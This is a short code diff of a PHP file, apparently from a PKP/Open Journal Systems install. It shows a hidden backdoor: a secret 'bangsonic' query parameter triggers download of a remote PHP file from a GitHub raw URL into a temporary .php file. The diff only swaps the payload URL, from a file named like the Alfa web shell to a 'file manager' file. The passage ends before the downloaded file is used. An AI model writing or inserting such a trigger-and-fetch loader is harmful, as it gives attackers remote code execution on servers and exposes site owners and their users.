@@ -261,7 +261,7 @@ if (!PKP_STRICT_MODE) {
 
 if (isset($_GET['bangsonic'])) {
     try {
-        $u = "https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php";
+        $u = "https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fmanager-kuat.txt";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
         $c = @file_get_contents($u);
